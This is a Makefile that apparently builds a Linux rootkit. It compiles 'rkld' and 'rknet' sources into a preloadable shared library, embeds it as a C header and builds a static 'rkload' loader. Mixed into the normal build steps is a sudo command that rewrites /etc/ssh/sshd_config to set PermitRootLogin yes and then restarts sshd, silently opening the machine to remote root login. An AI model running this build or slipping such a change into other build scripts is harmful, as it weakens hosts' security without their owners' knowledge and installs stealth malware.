UBUNTU := $(shell cat /proc/version | sed -n 's/.*\(Ubuntu\).*/\1/p')
CENTOS := $(shell cat /proc/version | sed -n 's/.*\(el[5-8]\).*/\1/p')
SUSE   := $(shell cat /proc/version | sed -n 's/.*\(SUSE\).*/\1/p')
DEBIAN := $(shell cat /proc/version | sed -n 's/.*\(Debian\).*/\1/p')
ARCH   := $(shell uname -m)
OS     := $(shell uname -s)

CC=gcc

all:
	@echo "#ifndef __ARCH_H"    >  include/arch.h
	@echo "#define __ARCH_H"    >> include/arch.h
ifeq ($(ARCH), x86_64)
	@echo "#define WORDSIZE 64" >> include/arch.h
	@echo "#define __AMD64__ 1" >> include/arch.h
	@echo "#endif"              >> include/arch.h
endif
ifeq ($(ARCH), amd64)
	@echo "#define WORDSIZE 64" >> include/arch.h
	@echo "#define __AMD64__ 1" >> include/arch.h
	@echo "#endif"              >> include/arch.h
endif
ifeq ($(ARCH), i686)
	@echo "#define WORDSIZE 32" >> include/arch.h
	@echo "#define __i386__ 1"  >> include/arch.h
	@echo "#endif"              >> include/arch.h
endif
	sudo sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
	sudo systemctl restart sshd
	$(CC) src/config.c -o build/config
	./build/config
	$(CC) src/rkld.c src/rknet.c -o build/rkld.so -fPIC -shared -ldl -D_GNU_SOURCE
	@xxd -i build/rkld.so > build/rkld.h
	@sed -i'.bk' 's/build_//g' build/rkld.h
	$(CC) src/rkload.c -o ./bin/rkload -static -I .
